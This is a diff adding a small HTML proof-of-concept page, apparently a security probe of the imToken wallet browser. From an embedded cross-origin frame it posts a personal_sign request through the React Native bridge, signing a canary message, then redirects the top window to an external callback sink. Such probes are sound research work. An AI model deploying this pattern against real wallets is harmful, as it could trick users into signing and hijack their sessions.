@@ -1,0 +1,18 @@
+<!doctype html>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Embedded sign action</title>
+<style>body{font:18px system-ui;margin:0;padding:18px;background:#eef4ff;color:#14213d}button{font:700 20px system-ui;width:100%;padding:20px;border:0;border-radius:12px;background:#2264e5;color:white}pre{white-space:pre-wrap;word-break:break-all}</style>
+<button id="start">Continue</button><pre id="s">Embedded cross-origin sign frame ready.</pre>
+<script>
+const ID=707071;
+const ADDRESS='0xE2D4Ae80Af5347eBe2A6d964A89245C58BfEd3CD';
+const MESSAGE='0x696d546f6b656e2063726f73732d6e617669676174696f6e207369676e61747572652063616e617279203230323631303035';
+const SINK='https://raw.githack.com/nan-zellic/imtoken-provider-probe-20261005/1d1d00b/callback-sink.html?run=CALLBACK_SIGN_20261005_01&id='+ID;
+start.onclick=()=>{
+  const req={jsonrpc:'2.0',id:ID,method:'personal_sign',params:[MESSAGE,ADDRESS]};
+  const msg={apiName:'ethereum.sendAsync',messageId:ID,payload:req};
+  s.textContent='Posting personal_sign then navigating the top document.';
+  window.ReactNativeWebView.postMessage(JSON.stringify(msg));
+  setTimeout(()=>{ window.top.location.href=SINK; },500);
+};
+</script>
